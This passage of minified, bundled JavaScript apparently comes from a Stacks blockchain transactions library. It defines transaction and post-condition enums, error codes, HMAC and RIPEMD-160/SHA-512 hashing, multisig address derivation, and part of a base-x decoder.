        "use strict";
        n.d(t, { V1: () => s, VM: () => c, co: () => a, fi: () => l });
        var r = n(9007),
          i = n(5398),
          o = n(9083);
        function s(e) {
          if ((0, o.nr)(e).byteLength != r.UE) throw Error("Invalid signature");
          return { type: r.L8.MessageSignature, data: e };
        }
        function a(e, t) {
          switch (e) {
            case r.dO.SerializeP2PKH:
              switch (t) {
                case r.Kn.Mainnet:
                  return r.TK.MainnetSingleSig;
                case r.Kn.Testnet:
                  return r.TK.TestnetSingleSig;
                default:
                  throw new Error(
                    `Unexpected txVersion ${JSON.stringify(
                      t
                    )} for hashMode ${e}`
                  );
              }
            case r.dO.SerializeP2SH:
            case r.dO.SerializeP2WPKH:
            case r.dO.SerializeP2WSH:
              switch (t) {
                case r.Kn.Mainnet:
                  return r.TK.MainnetMultiSig;
                case r.Kn.Testnet:
                  return r.TK.TestnetMultiSig;
                default:
                  throw new Error(
                    `Unexpected txVersion ${JSON.stringify(
                      t
                    )} for hashMode ${e}`
                  );
              }
            default:
              throw new Error(`Unexpected hashMode ${JSON.stringify(e)}`);
          }
        }
        function l(e, t) {
          return { type: r.L8.Address, version: e, hash160: t };
        }
        function c(e) {
          return (0, i.H4)(e.version, e.hash160);
        }
      },
      9007: (e, t, n) => {
        "use strict";
        var r;
        n.d(t, {
          Am: () => I,
          Cy: () => o,
          DY: () => C,
          GY: () => l,
          Gr: () => x,
          Kn: () => v,
          L8: () => d,
          MX: () => p,
          Nv: () => s,
          Pe: () => a,
          TK: () => k,
          UE: () => c,
          YZ: () => O,
          dO: () => A,
          dV: () => h,
          gO: () => b,
          gW: () => T,
          hW: () => E,
          oK: () => r,
          rC: () => i,
          sX: () => S,
          u0: () => y,
          wS: () => f,
          y: () => g,
          yl: () => u,
        }),
          (function (e) {
            (e[(e.Testnet = 2147483648)] = "Testnet"),
              (e[(e.Mainnet = 1)] = "Mainnet");
          })(r || (r = {}));
        const i = r.Mainnet,
          o = 128,
          s = 128,
          a = 16,
          l = 32,
          c = 65,
          u = 32,
          f = 64,
          h = 34;
        var d, p, g, y;
        !(function (e) {
          (e[(e.Address = 0)] = "Address"),
            (e[(e.Principal = 1)] = "Principal"),
            (e[(e.LengthPrefixedString = 2)] = "LengthPrefixedString"),
            (e[(e.MemoString = 3)] = "MemoString"),
            (e[(e.AssetInfo = 4)] = "AssetInfo"),
            (e[(e.PostCondition = 5)] = "PostCondition"),
            (e[(e.PublicKey = 6)] = "PublicKey"),
            (e[(e.LengthPrefixedList = 7)] = "LengthPrefixedList"),
            (e[(e.Payload = 8)] = "Payload"),
            (e[(e.MessageSignature = 9)] = "MessageSignature"),
            (e[(e.StructuredDataSignature = 10)] = "StructuredDataSignature"),
            (e[(e.TransactionAuthField = 11)] = "TransactionAuthField");
        })(d || (d = {})),
          (function (e) {
            (e[(e.TokenTransfer = 0)] = "TokenTransfer"),
              (e[(e.SmartContract = 1)] = "SmartContract"),
              (e[(e.VersionedSmartContract = 6)] = "VersionedSmartContract"),
              (e[(e.ContractCall = 2)] = "ContractCall"),
              (e[(e.PoisonMicroblock = 3)] = "PoisonMicroblock"),
              (e[(e.Coinbase = 4)] = "Coinbase"),
              (e[(e.CoinbaseToAltRecipient = 5)] = "CoinbaseToAltRecipient");
          })(p || (p = {})),
          (function (e) {
            (e[(e.Clarity1 = 1)] = "Clarity1"),
              (e[(e.Clarity2 = 2)] = "Clarity2");
          })(g || (g = {})),
          (function (e) {
            (e[(e.OnChainOnly = 1)] = "OnChainOnly"),
              (e[(e.OffChainOnly = 2)] = "OffChainOnly"),
              (e[(e.Any = 3)] = "Any");
          })(y || (y = {}));
        const w = ["onChainOnly", "offChainOnly", "any"],
          m = {
            [w[0]]: y.OnChainOnly,
            [w[1]]: y.OffChainOnly,
            [w[2]]: y.Any,
            [y.OnChainOnly]: y.OnChainOnly,
            [y.OffChainOnly]: y.OffChainOnly,
            [y.Any]: y.Any,
          };
        function b(e) {
          if (e in m) return m[e];
          throw new Error(
            `Invalid anchor mode "${e}", must be one of: ${w.join(", ")}`
          );
        }
        var v;
        !(function (e) {
          (e[(e.Mainnet = 0)] = "Mainnet"), (e[(e.Testnet = 128)] = "Testnet");
        })(v || (v = {}));
        v.Mainnet;
        var E, S, x, A, k, T, C, I, O, B, P;
        !(function (e) {
          (e[(e.Allow = 1)] = "Allow"), (e[(e.Deny = 2)] = "Deny");
        })(E || (E = {})),
          (function (e) {
            (e[(e.STX = 0)] = "STX"),
              (e[(e.Fungible = 1)] = "Fungible"),
              (e[(e.NonFungible = 2)] = "NonFungible");
          })(S || (S = {})),
          (function (e) {
            (e[(e.Standard = 4)] = "Standard"),
              (e[(e.Sponsored = 5)] = "Sponsored");
          })(x || (x = {})),
          (function (e) {
            (e[(e.SerializeP2PKH = 0)] = "SerializeP2PKH"),
              (e[(e.SerializeP2SH = 1)] = "SerializeP2SH"),
              (e[(e.SerializeP2WPKH = 2)] = "SerializeP2WPKH"),
              (e[(e.SerializeP2WSH = 3)] = "SerializeP2WSH");
          })(A || (A = {})),
          (function (e) {
            (e[(e.MainnetSingleSig = 22)] = "MainnetSingleSig"),
              (e[(e.MainnetMultiSig = 20)] = "MainnetMultiSig"),
              (e[(e.TestnetSingleSig = 26)] = "TestnetSingleSig"),
              (e[(e.TestnetMultiSig = 21)] = "TestnetMultiSig");
          })(k || (k = {})),
          (function (e) {
            (e[(e.Compressed = 0)] = "Compressed"),
              (e[(e.Uncompressed = 1)] = "Uncompressed");
          })(T || (T = {})),
          (function (e) {
            (e[(e.Equal = 1)] = "Equal"),
              (e[(e.Greater = 2)] = "Greater"),
              (e[(e.GreaterEqual = 3)] = "GreaterEqual"),
              (e[(e.Less = 4)] = "Less"),
              (e[(e.LessEqual = 5)] = "LessEqual");
          })(C || (C = {})),
          (function (e) {
            (e[(e.Sends = 16)] = "Sends"),
              (e[(e.DoesNotSend = 17)] = "DoesNotSend");
          })(I || (I = {})),
          (function (e) {
            (e[(e.Origin = 1)] = "Origin"),
              (e[(e.Standard = 2)] = "Standard"),
              (e[(e.Contract = 3)] = "Contract");
          })(O || (O = {})),
          (function (e) {
            (e[(e.STX = 0)] = "STX"),
              (e[(e.Fungible = 1)] = "Fungible"),
              (e[(e.NonFungible = 2)] = "NonFungible");
          })(B || (B = {})),
          (function (e) {
            (e.Serialization = "Serialization"),
              (e.Deserialization = "Deserialization"),
              (e.SignatureValidation = "SignatureValidation"),
              (e.FeeTooLow = "FeeTooLow"),
              (e.BadNonce = "BadNonce"),
              (e.NotEnoughFunds = "NotEnoughFunds"),
              (e.NoSuchContract = "NoSuchContract"),
              (e.NoSuchPublicFunction = "NoSuchPublicFunction"),
              (e.BadFunctionArgument = "BadFunctionArgument"),
              (e.ContractAlreadyExists = "ContractAlreadyExists"),
              (e.PoisonMicroblocksDoNotConflict =
                "PoisonMicroblocksDoNotConflict"),
              (e.PoisonMicroblockHasUnknownPubKeyHash =
                "PoisonMicroblockHasUnknownPubKeyHash"),
              (e.PoisonMicroblockIsInvalid = "PoisonMicroblockIsInvalid"),
              (e.BadAddressVersionByte = "BadAddressVersionByte"),
              (e.NoCoinbaseViaMempool = "NoCoinbaseViaMempool"),
              (e.ServerFailureNoSuchChainTip = "ServerFailureNoSuchChainTip"),
              (e.ServerFailureDatabase = "ServerFailureDatabase"),
              (e.ServerFailureOther = "ServerFailureOther");
          })(P || (P = {}));
      },
      718: (e, t, n) => {
        "use strict";
        n.d(t, {
          Lg: () => S,
          NG: () => w,
          aQ: () => x,
          EJ: () => y,
          $3: () => T,
          Dn: () => b,
          D5: () => m,
          dK: () => v,
          fJ: () => k,
        });
        var r = n(6379),
          i = n(3925);
        class o extends i.kb {
          constructor(e, t) {
            super(), (this.finished = !1), (this.destroyed = !1), r.ZP.hash(e);
            const n = (0, i.O0)(t);
            if (
              ((this.iHash = e.create()),
              "function" !== typeof this.iHash.update)
            )
              throw new TypeError(
                "Expected instance of class which extends utils.Hash"
              );
            (this.blockLen = this.iHash.blockLen),
              (this.outputLen = this.iHash.outputLen);
            const o = this.blockLen,
              s = new Uint8Array(o);
            s.set(n.length > o ? e.create().update(n).digest() : n);
            for (let r = 0; r < s.length; r++) s[r] ^= 54;
            this.iHash.update(s), (this.oHash = e.create());
            for (let r = 0; r < s.length; r++) s[r] ^= 106;
            this.oHash.update(s), s.fill(0);
          }
          update(e) {
            return r.ZP.exists(this), this.iHash.update(e), this;
          }
          digestInto(e) {
            r.ZP.exists(this),
              r.ZP.bytes(e, this.outputLen),
              (this.finished = !0),
              this.iHash.digestInto(e),
              this.oHash.update(e),
              this.oHash.digestInto(e),
              this.destroy();
          }
          digest() {
            const e = new Uint8Array(this.oHash.outputLen);
            return this.digestInto(e), e;
          }
          _cloneInto(e) {
            e || (e = Object.create(Object.getPrototypeOf(this), {}));
            const {
              oHash: t,
              iHash: n,
              finished: r,
              destroyed: i,
              blockLen: o,
              outputLen: s,
            } = this;
            return (
              (e.finished = r),
              (e.destroyed = i),
              (e.blockLen = o),
              (e.outputLen = s),
              (e.oHash = t._cloneInto(e.oHash)),
              (e.iHash = n._cloneInto(e.iHash)),
              e
            );
          }
          destroy() {
            (this.destroyed = !0), this.oHash.destroy(), this.iHash.destroy();
          }
        }
        const s = (e, t, n) => new o(e, t).update(n).digest();
        s.create = (e, t) => new o(e, t);
        var a = n(3552),
          l = n(9090),
          c = n(9083);
        const u = 32;
        var f = n(2755),
          h = n(8261),
          d = (n(5398), n(7354)),
          p = n(9007),
          g = n(7179);
        function y(e) {
          let t =
            arguments.length > 1 && void 0 !== arguments[1]
              ? arguments[1]
              : p.Kn.Mainnet;
          e = "string" === typeof e ? e : (0, c.ci)(e);
          const n = (0, d.co)(p.dO.SerializeP2PKH, t),
            r = (0, d.fi)(n, (0, g.D2)((0, c.nr)(e)));
          return (0, d.VM)(r);
        }
        function w(e) {
          return { type: p.L8.PublicKey, data: (0, c.nr)(e) };
        }
        function m(e, t) {
          let n =
            arguments.length > 2 && void 0 !== arguments[2]
              ? arguments[2]
              : p.gW.Compressed;
          const r = (function (e) {
              if (e.length < 2 * u * 2 + 1)
                throw new Error("Invalid signature");
              const t = e.slice(0, 2),
                n = e.slice(2, 2 + 2 * u),
                r = e.slice(2 + 2 * u);
              return { recoveryId: (0, c.WR)(t), r: n, s: r };
            })(t.data),
            i = new l.Pc((0, c.y_)(r.r), (0, c.y_)(r.s)),
            o = l.E9.fromSignature(e, i, r.recoveryId),
            s = n === p.gW.Compressed;
          return o.toHex(s);
        }
        function b(e) {
          return !(0, c.ci)(e.data).startsWith("04");
        }
        function v(e) {
          return e.data.slice();
        }
        function E(e) {
          const t = A(e),
            n = (0, l.$3)(t.data.slice(0, 32), t.compressed);
          return w((0, c.ci)(n));
        }
        function S(e) {
          const t = "string" === typeof e ? e : (0, c.ci)(e);
          return w(l.E9.fromHex(t).toHex(!0));
        }
        function x(e) {
          const t = e.readUInt8(),
            n = 4 !== t ? p.yl : p.wS;
          return (
            (r = (0, c.WW)([t, e.readBytes(n)])),
            { type: p.L8.PublicKey, data: r }
          );
          var r;
        }
        function A(e) {
          const t = (0, f.z)(e);
          return { data: t, compressed: t.length == h.yo };
        }
        function k(e, t) {
          const [n, r] = (0, l.kS)(t, e.data.slice(0, 32), {
            canonical: !0,
            recovered: !0,
          });
          if (null == r) throw new Error("No signature recoveryId received");
          const i = (0, c.I4)(r, 1) + l.Pc.fromHex(n).toCompactHex();
          return (0, d.V1)(i);
        }
        function T(e) {
          return E(e.data);
        }
        l.P6.hmacSha256Sync = function (e) {
          const t = s.create(a.J, e);
          for (
            var n = arguments.length, r = new Array(n > 1 ? n - 1 : 0), i = 1;
            i < n;
            i++
          )
            r[i - 1] = arguments[i];
          return r.forEach((e) => t.update(e)), t.digest();
        };
      },
      7179: (e, t, n) => {
        "use strict";
        n.d(t, {
          Xh: () => M,
          pw: () => D,
          D2: () => z,
          UI: () => W,
          rv: () => K,
          tM: () => V,
          YI: () => q,
          c1: () => $,
          Sq: () => H,
          G8: () => F,
        });
        var r = n(8206),
          i = n(3925);
        const o = new Uint8Array([
            7, 4, 13, 1, 10, 6, 15, 3, 12, 0, 9, 5, 2, 14, 11, 8,
          ]),
          s = Uint8Array.from({ length: 16 }, (e, t) => t),
          a = s.map((e) => (9 * e + 5) % 16);
        let l = [s],
          c = [a];
        for (let G = 0; G < 4; G++)
          for (let e of [l, c]) e.push(e[G].map((e) => o[e]));
        const u = [
            [11, 14, 15, 12, 5, 8, 7, 9, 11, 13, 14, 15, 6, 7, 9, 8],
            [12, 13, 11, 15, 6, 9, 9, 7, 12, 15, 11, 13, 7, 8, 7, 7],
            [13, 15, 14, 11, 7, 7, 6, 8, 13, 14, 13, 12, 5, 5, 6, 9],
            [14, 11, 12, 14, 8, 6, 5, 5, 15, 12, 15, 14, 9, 9, 8, 6],
            [15, 12, 13, 13, 9, 5, 8, 6, 14, 11, 12, 11, 8, 6, 5, 5],
          ].map((e) => new Uint8Array(e)),
          f = l.map((e, t) => e.map((e) => u[t][e])),
          h = c.map((e, t) => e.map((e) => u[t][e])),
          d = new Uint32Array([
            0, 1518500249, 1859775393, 2400959708, 2840853838,
          ]),
          p = new Uint32Array([
            1352829926, 1548603684, 1836072691, 2053994217, 0,
          ]),
          g = (e, t) => (e << t) | (e >>> (32 - t));
        function y(e, t, n, r) {
          return 0 === e
            ? t ^ n ^ r
            : 1 === e
            ? (t & n) | (~t & r)
            : 2 === e
            ? (t | ~n) ^ r
            : 3 === e
            ? (t & r) | (n & ~r)
            : t ^ (n | ~r);
        }
        const w = new Uint32Array(16);
        class m extends r.N {
          constructor() {
            super(64, 20, 8, !0),
              (this.h0 = 1732584193),
              (this.h1 = -271733879),
              (this.h2 = -1732584194),
              (this.h3 = 271733878),
              (this.h4 = -1009589776);
          }
          get() {
            const { h0: e, h1: t, h2: n, h3: r, h4: i } = this;
            return [e, t, n, r, i];
          }
          set(e, t, n, r, i) {
            (this.h0 = 0 | e),
              (this.h1 = 0 | t),
              (this.h2 = 0 | n),
              (this.h3 = 0 | r),
              (this.h4 = 0 | i);
          }
          process(e, t) {
            for (let l = 0; l < 16; l++, t += 4) w[l] = e.getUint32(t, !0);
            let n = 0 | this.h0,
              r = n,
              i = 0 | this.h1,
              o = i,
              s = 0 | this.h2,
              a = s,
              u = 0 | this.h3,
              m = u,
              b = 0 | this.h4,
              v = b;
            for (let E = 0; E < 5; E++) {
              const e = 4 - E,
                t = d[E],
                S = p[E],
                x = l[E],
                A = c[E],
                k = f[E],
                T = h[E];
              for (let r = 0; r < 16; r++) {
                const e = (g(n + y(E, i, s, u) + w[x[r]] + t, k[r]) + b) | 0;
                (n = b), (b = u), (u = 0 | g(s, 10)), (s = i), (i = e);
              }
              for (let n = 0; n < 16; n++) {
                const t = (g(r + y(e, o, a, m) + w[A[n]] + S, T[n]) + v) | 0;
                (r = v), (v = m), (m = 0 | g(a, 10)), (a = o), (o = t);
              }
            }
            this.set(
              (this.h1 + s + m) | 0,
              (this.h2 + u + v) | 0,
              (this.h3 + b + r) | 0,
              (this.h4 + n + o) | 0,
              (this.h0 + i + a) | 0
            );
          }
          roundClean() {
            w.fill(0);
          }
          destroy() {
            (this.destroyed = !0), this.buffer.fill(0), this.set(0, 0, 0, 0, 0);
          }
        }
        const b = (0, i.hE)(() => new m());
        var v = n(3552);
        const E = BigInt(2 ** 32 - 1),
          S = BigInt(32);
        function x(e) {
          return arguments.length > 1 && void 0 !== arguments[1] && arguments[1]
            ? { h: Number(e & E), l: Number((e >> S) & E) }
            : { h: 0 | Number((e >> S) & E), l: 0 | Number(e & E) };
        }
        const A = {
            fromBig: x,
            split: function (e) {
              let t =
                  arguments.length > 1 &&
                  void 0 !== arguments[1] &&
                  arguments[1],
                n = new Uint32Array(e.length),
                r = new Uint32Array(e.length);
              for (let i = 0; i < e.length; i++) {
                const { h: o, l: s } = x(e[i], t);
                [n[i], r[i]] = [o, s];
              }
              return [n, r];
            },
            toBig: (e, t) => (BigInt(e >>> 0) << S) | BigInt(t >>> 0),
            shrSH: (e, t, n) => e >>> n,
            shrSL: (e, t, n) => (e << (32 - n)) | (t >>> n),
            rotrSH: (e, t, n) => (e >>> n) | (t << (32 - n)),
            rotrSL: (e, t, n) => (e << (32 - n)) | (t >>> n),
            rotrBH: (e, t, n) => (e << (64 - n)) | (t >>> (n - 32)),
            rotrBL: (e, t, n) => (e >>> (n - 32)) | (t << (64 - n)),
            rotr32H: (e, t) => t,
            rotr32L: (e, t) => e,
            rotlSH: (e, t, n) => (e << n) | (t >>> (32 - n)),
            rotlSL: (e, t, n) => (t << n) | (e >>> (32 - n)),
            rotlBH: (e, t, n) => (t << (n - 32)) | (e >>> (64 - n)),
            rotlBL: (e, t, n) => (e << (n - 32)) | (t >>> (64 - n)),
            add: function (e, t, n, r) {
              const i = (t >>> 0) + (r >>> 0);
              return { h: (e + n + ((i / 2 ** 32) | 0)) | 0, l: 0 | i };
            },
            add3L: (e, t, n) => (e >>> 0) + (t >>> 0) + (n >>> 0),
            add3H: (e, t, n, r) => (t + n + r + ((e / 2 ** 32) | 0)) | 0,
            add4L: (e, t, n, r) =>
              (e >>> 0) + (t >>> 0) + (n >>> 0) + (r >>> 0),
            add4H: (e, t, n, r, i) => (t + n + r + i + ((e / 2 ** 32) | 0)) | 0,
            add5H: (e, t, n, r, i, o) =>
              (t + n + r + i + o + ((e / 2 ** 32) | 0)) | 0,
            add5L: (e, t, n, r, i) =>
              (e >>> 0) + (t >>> 0) + (n >>> 0) + (r >>> 0) + (i >>> 0),
          },
          [k, T] = A.split(
            [
              "0x428a2f98d728ae22",
              "0x7137449123ef65cd",
              "0xb5c0fbcfec4d3b2f",
              "0xe9b5dba58189dbbc",
              "0x3956c25bf348b538",
              "0x59f111f1b605d019",
              "0x923f82a4af194f9b",
              "0xab1c5ed5da6d8118",
              "0xd807aa98a3030242",
              "0x12835b0145706fbe",
              "0x243185be4ee4b28c",
              "0x550c7dc3d5ffb4e2",
              "0x72be5d74f27b896f",
              "0x80deb1fe3b1696b1",
              "0x9bdc06a725c71235",
              "0xc19bf174cf692694",
              "0xe49b69c19ef14ad2",
              "0xefbe4786384f25e3",
              "0x0fc19dc68b8cd5b5",
              "0x240ca1cc77ac9c65",
              "0x2de92c6f592b0275",
              "0x4a7484aa6ea6e483",
              "0x5cb0a9dcbd41fbd4",
              "0x76f988da831153b5",
              "0x983e5152ee66dfab",
              "0xa831c66d2db43210",
              "0xb00327c898fb213f",
              "0xbf597fc7beef0ee4",
              "0xc6e00bf33da88fc2",
              "0xd5a79147930aa725",
              "0x06ca6351e003826f",
              "0x142929670a0e6e70",
              "0x27b70a8546d22ffc",
              "0x2e1b21385c26c926",
              "0x4d2c6dfc5ac42aed",
              "0x53380d139d95b3df",
              "0x650a73548baf63de",
              "0x766a0abb3c77b2a8",
              "0x81c2c92e47edaee6",
              "0x92722c851482353b",
              "0xa2bfe8a14cf10364",
              "0xa81a664bbc423001",
              "0xc24b8b70d0f89791",
              "0xc76c51a30654be30",
              "0xd192e819d6ef5218",
              "0xd69906245565a910",
              "0xf40e35855771202a",
              "0x106aa07032bbd1b8",
              "0x19a4c116b8d2d0c8",
              "0x1e376c085141ab53",
              "0x2748774cdf8eeb99",
              "0x34b0bcb5e19b48a8",
              "0x391c0cb3c5c95a63",
              "0x4ed8aa4ae3418acb",
              "0x5b9cca4f7763e373",
              "0x682e6ff3d6b2b8a3",
              "0x748f82ee5defb2fc",
              "0x78a5636f43172f60",
              "0x84c87814a1f0ab72",
              "0x8cc702081a6439ec",
              "0x90befffa23631e28",
              "0xa4506cebde82bde9",
              "0xbef9a3f7b2c67915",
              "0xc67178f2e372532b",
              "0xca273eceea26619c",
              "0xd186b8c721c0c207",
              "0xeada7dd6cde0eb1e",
              "0xf57d4f7fee6ed178",
              "0x06f067aa72176fba",
              "0x0a637dc5a2c898a6",
              "0x113f9804bef90dae",
              "0x1b710b35131c471b",
              "0x28db77f523047d84",
              "0x32caab7b40c72493",
              "0x3c9ebe0a15c9bebc",
              "0x431d67c49c100d4c",
              "0x4cc5d4becb3e42b6",
              "0x597f299cfc657e2a",
              "0x5fcb6fab3ad6faec",
              "0x6c44198c4a475817",
            ].map((e) => BigInt(e))
          ),
          C = new Uint32Array(80),
          I = new Uint32Array(80);
        class O extends r.N {
          constructor() {
            super(128, 64, 16, !1),
              (this.Ah = 1779033703),
              (this.Al = -205731576),
              (this.Bh = -1150833019),
              (this.Bl = -2067093701),
              (this.Ch = 1013904242),
              (this.Cl = -23791573),
              (this.Dh = -1521486534),
              (this.Dl = 1595750129),
              (this.Eh = 1359893119),
              (this.El = -1377402159),
              (this.Fh = -1694144372),
              (this.Fl = 725511199),
              (this.Gh = 528734635),
              (this.Gl = -79577749),
              (this.Hh = 1541459225),
              (this.Hl = 327033209);
          }
          get() {
            const {
              Ah: e,
              Al: t,
              Bh: n,
              Bl: r,
              Ch: i,
              Cl: o,
              Dh: s,
              Dl: a,
              Eh: l,
              El: c,
              Fh: u,
              Fl: f,
              Gh: h,
              Gl: d,
              Hh: p,
              Hl: g,
            } = this;
            return [e, t, n, r, i, o, s, a, l, c, u, f, h, d, p, g];
          }
          set(e, t, n, r, i, o, s, a, l, c, u, f, h, d, p, g) {
            (this.Ah = 0 | e),
              (this.Al = 0 | t),
              (this.Bh = 0 | n),
              (this.Bl = 0 | r),
              (this.Ch = 0 | i),
              (this.Cl = 0 | o),
              (this.Dh = 0 | s),
              (this.Dl = 0 | a),
              (this.Eh = 0 | l),
              (this.El = 0 | c),
              (this.Fh = 0 | u),
              (this.Fl = 0 | f),
              (this.Gh = 0 | h),
              (this.Gl = 0 | d),
              (this.Hh = 0 | p),
              (this.Hl = 0 | g);
          }
          process(e, t) {
            for (let m = 0; m < 16; m++, t += 4)
              (C[m] = e.getUint32(t)), (I[m] = e.getUint32((t += 4)));
            for (let m = 16; m < 80; m++) {
              const e = 0 | C[m - 15],
                t = 0 | I[m - 15],
                n = A.rotrSH(e, t, 1) ^ A.rotrSH(e, t, 8) ^ A.shrSH(e, t, 7),
                r = A.rotrSL(e, t, 1) ^ A.rotrSL(e, t, 8) ^ A.shrSL(e, t, 7),
                i = 0 | C[m - 2],
                o = 0 | I[m - 2],
                s = A.rotrSH(i, o, 19) ^ A.rotrBH(i, o, 61) ^ A.shrSH(i, o, 6),
                a = A.rotrSL(i, o, 19) ^ A.rotrBL(i, o, 61) ^ A.shrSL(i, o, 6),
                l = A.add4L(r, a, I[m - 7], I[m - 16]),
                c = A.add4H(l, n, s, C[m - 7], C[m - 16]);
              (C[m] = 0 | c), (I[m] = 0 | l);
            }
            let {
              Ah: n,
              Al: r,
              Bh: i,
              Bl: o,
              Ch: s,
              Cl: a,
              Dh: l,
              Dl: c,
              Eh: u,
              El: f,
              Fh: h,
              Fl: d,
              Gh: p,
              Gl: g,
              Hh: y,
              Hl: w,
            } = this;
            for (let m = 0; m < 80; m++) {
              const e =
                  A.rotrSH(u, f, 14) ^ A.rotrSH(u, f, 18) ^ A.rotrBH(u, f, 41),
                t =
                  A.rotrSL(u, f, 14) ^ A.rotrSL(u, f, 18) ^ A.rotrBL(u, f, 41),
                b = (u & h) ^ (~u & p),
                v = (f & d) ^ (~f & g),
                E = A.add5L(w, t, v, T[m], I[m]),
                S = A.add5H(E, y, e, b, k[m], C[m]),
                x = 0 | E,
                O =
                  A.rotrSH(n, r, 28) ^ A.rotrBH(n, r, 34) ^ A.rotrBH(n, r, 39),
                B =
                  A.rotrSL(n, r, 28) ^ A.rotrBL(n, r, 34) ^ A.rotrBL(n, r, 39),
                P = (n & i) ^ (n & s) ^ (i & s),
                _ = (r & o) ^ (r & a) ^ (o & a);
              (y = 0 | p),
                (w = 0 | g),
                (p = 0 | h),
                (g = 0 | d),
                (h = 0 | u),
                (d = 0 | f),
                ({ h: u, l: f } = A.add(0 | l, 0 | c, 0 | S, 0 | x)),
                (l = 0 | s),
                (c = 0 | a),
                (s = 0 | i),
                (a = 0 | o),
                (i = 0 | n),
                (o = 0 | r);
              const U = A.add3L(x, B, _);
              (n = A.add3H(U, S, O, P)), (r = 0 | U);
            }
            ({ h: n, l: r } = A.add(0 | this.Ah, 0 | this.Al, 0 | n, 0 | r)),
              ({ h: i, l: o } = A.add(0 | this.Bh, 0 | this.Bl, 0 | i, 0 | o)),
              ({ h: s, l: a } = A.add(0 | this.Ch, 0 | this.Cl, 0 | s, 0 | a)),
              ({ h: l, l: c } = A.add(0 | this.Dh, 0 | this.Dl, 0 | l, 0 | c)),
              ({ h: u, l: f } = A.add(0 | this.Eh, 0 | this.El, 0 | u, 0 | f)),
              ({ h: h, l: d } = A.add(0 | this.Fh, 0 | this.Fl, 0 | h, 0 | d)),
              ({ h: p, l: g } = A.add(0 | this.Gh, 0 | this.Gl, 0 | p, 0 | g)),
              ({ h: y, l: w } = A.add(0 | this.Hh, 0 | this.Hl, 0 | y, 0 | w)),
              this.set(n, r, i, o, s, a, l, c, u, f, h, d, p, g, y, w);
          }
          roundClean() {
            C.fill(0), I.fill(0);
          }
          destroy() {
            this.buffer.fill(0),
              this.set(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
          }
        }
        class B extends O {
          constructor() {
            super(),
              (this.Ah = -1942145080),
              (this.Al = 424955298),
              (this.Bh = 1944164710),
              (this.Bl = -1982016298),
              (this.Ch = 502970286),
              (this.Cl = 855612546),
              (this.Dh = 1738396948),
              (this.Dl = 1479516111),
              (this.Eh = 258812777),
              (this.El = 2077511080),
              (this.Fh = 2011393907),
              (this.Fl = 79989058),
              (this.Gh = 1067287976),
              (this.Gl = 1780299464),
              (this.Hh = 286451373),
              (this.Hl = -1848208735),
              (this.outputLen = 28);
          }
        }
        class P extends O {
          constructor() {
            super(),
              (this.Ah = 573645204),
              (this.Al = -64227540),
              (this.Bh = -1621794909),
              (this.Bl = -934517566),
              (this.Ch = 596883563),
              (this.Cl = 1867755857),
              (this.Dh = -1774684391),
              (this.Dl = 1497426621),
              (this.Eh = -1775747358),
              (this.El = -1467023389),
              (this.Fh = -1101128155),
              (this.Fl = 1401305490),
              (this.Gh = 721525244),
              (this.Gl = 746961066),
              (this.Hh = 246885852),
              (this.Hl = -2117784414),
              (this.outputLen = 32);
          }
        }
        class _ extends O {
          constructor() {
            super(),
              (this.Ah = -876896931),
              (this.Al = -1056596264),
              (this.Bh = 1654270250),
              (this.Bl = 914150663),
              (this.Ch = -1856437926),
              (this.Cl = 812702999),
              (this.Dh = 355462360),
              (this.Dl = -150054599),
              (this.Eh = 1731405415),
              (this.El = -4191439),
              (this.Fh = -1900787065),
              (this.Fl = 1750603025),
              (this.Gh = -619958771),
              (this.Gl = 1694076839),
              (this.Hh = 1203062813),
              (this.Hl = -1090891868),
              (this.outputLen = 48);
          }
        }
        (0, i.hE)(() => new O()), (0, i.hE)(() => new B());
        const U = (0, i.hE)(() => new P());
        (0, i.hE)(() => new _());
        n(9090);
        var N = n(9083),
          R = (n(5398), n(1016)),
          L = n.n(R);
        const $ = (e) => (e.length % 2 == 0 ? e : `0${e}`),
          H = (e, t) => e.padEnd(t, "0"),
          D = (e, t) => !!e && (0, N.iY)(e).length > t;
        function M(e) {
          return L()(e);
        }
        const F = (e) => (0, N.ci)(U(e)),
          j = (e) => b((0, v.J)(e)),
          z = (e) => (0, N.ci)(j(e)),
          K = (e) => {
            const t = j(e),
              n = (0, N.eV)(new Uint8Array([0]), new Uint8Array([t.length]), t),
              r = j(n);
            return (0, N.ci)(r);
          },
          W = (e, t) => {
            if (e > 15 || t.length > 15)
              throw Error(
                "P2SH multisig address can only contain up to 15 public keys"
              );
            const n = [];
            n.push(80 + e),
              t.forEach((e) => {
                n.push(e.length), n.push(e);
              }),
              n.push(80 + t.length),
              n.push(174);
            const r = (0, N.WW)(n),
              i = j(r);
            return (0, N.ci)(i);
          },
          V = (e, t) => {
            if (e > 15 || t.length > 15)
              throw Error(
                "P2WSH multisig address can only contain up to 15 public keys"
              );
            const n = [];
            n.push(80 + e),
              t.forEach((e) => {
                n.push(e.length), n.push(e);
              }),
              n.push(80 + t.length),
              n.push(174);
            const r = (0, N.WW)(n),
              i = (0, v.J)(r),
              o = [];
            o.push(0), o.push(i.length), o.push(i);
            const s = (0, N.WW)(o),
              a = j(s);
            return (0, N.ci)(a);
          };
        function q(e) {
          return (
            /^[a-zA-Z]([a-zA-Z0-9]|[-_!?+<>=/*])*$|^[-+=/*]$|^[<>]=?$/.test(
              e
            ) && e.length < 128
          );
        }
      },
      2307: (e) => {
        "use strict";
        e.exports = function (e) {
          if (e.length >= 255) throw new TypeError("Alphabet too long");
          for (var t = new Uint8Array(256), n = 0; n < t.length; n++)
            t[n] = 255;
          for (var r = 0; r < e.length; r++) {
            var i = e.charAt(r),
              o = i.charCodeAt(0);
            if (255 !== t[o]) throw new TypeError(i + " is ambiguous");
            t[o] = r;
          }
          var s = e.length,
            a = e.charAt(0),
            l = Math.log(s) / Math.log(256),
            c = Math.log(256) / Math.log(s);
          function u(e) {
            if ("string" !== typeof e) throw new TypeError("Expected String");
            if (0 === e.length) return new Uint8Array();
            for (var n = 0, r = 0, i = 0; e[n] === a; ) r++, n++;
            for (
              var o = ((e.length - n) * l + 1) >>> 0, c = new Uint8Array(o);
              e[n];

            ) {
              var u = t[e.charCodeAt(n)];
              if (255 === u) return;
              for (
                var f = 0, h = o - 1;
                (0 !== u || f < i) && -1 !== h;
                h--, f++
              )
                (u += (s * c[h]) >>> 0),
                  (c[h] = u % 256 >>> 0),
                  (u = (u / 256) >>> 0);
              if (0 !== u) throw new Error("Non-zero carry");
              (i = f), n++;
            }
            for (var d = o - i; d !== o && 0 === c[d]; ) d++;
